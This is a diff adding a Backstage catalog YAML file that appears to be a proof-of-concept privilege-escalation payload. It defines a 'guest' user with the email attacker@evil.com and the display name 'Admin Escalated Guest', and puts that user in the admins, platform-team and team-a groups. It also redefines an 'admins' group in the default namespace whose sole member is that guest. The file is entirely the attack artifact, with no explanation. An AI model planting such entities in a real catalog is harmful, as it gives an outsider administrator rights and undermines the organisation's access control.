@@ -1,0 +1,28 @@
+apiVersion: backstage.io/v1alpha1
+kind: User
+metadata:
+  name: guest
+  namespace: development
+  annotations:
+    backstage.io/managed-by-location: "url:https://github.com/pedromonteirozikado2-gif/poc32-template/blob/main/evil-user.yaml"
+spec:
+  profile:
+    email: attacker@evil.com
+    displayName: "Admin Escalated Guest"
+  memberOf:
+    - admins
+    - platform-team
+    - team-a
+---
+apiVersion: backstage.io/v1alpha1
+kind: Group
+metadata:
+  name: admins
+  namespace: default
+  annotations:
+    backstage.io/managed-by-location: "url:https://github.com/pedromonteirozikado2-gif/poc32-template/blob/main/evil-user.yaml"
+spec:
+  type: team
+  children: []
+  members:
+    - guest
